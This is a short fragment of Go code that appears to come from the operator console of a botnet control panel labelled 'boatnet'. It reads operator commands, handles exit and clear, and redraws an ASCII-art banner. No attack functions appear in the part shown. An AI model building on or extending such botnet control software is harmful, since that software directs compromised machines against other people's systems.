this.conn.Write([]byte("\x1b[1;37;47m \x1b[1;37melisey \x1b[1;31m● boatnet \033[0m\x1b[1;37m ➤➤ "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
        if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\x1b[1;37m             \x1b[1;31m       .::.   \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m             \x1b[1;31m     .:'  .:  \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m        ,MMM8\x1b[1;31m&&&.:'   .:'  \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m       MMMMM88\x1b[1;31m&&&&  .:'    \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m      MMMMM88\x1b[1;31m&&&&&&:'      \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m      MMMMM88\x1b[1;31m&&&&&&        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m    .:MMMMM88\x1b[1;31m&&&&&&        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m  .:'  MMMMM88\x1b[1;31m&&&&         \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m.:'   .:'MMM8\x1b[1;31m&&&'          \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m:'  .:'      \x1b[1;31m              \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m'::'         \x1b[1;31m              \r\n"))
    this.conn.Write([]byte("\r\n\033[0m"))
            continue
        }
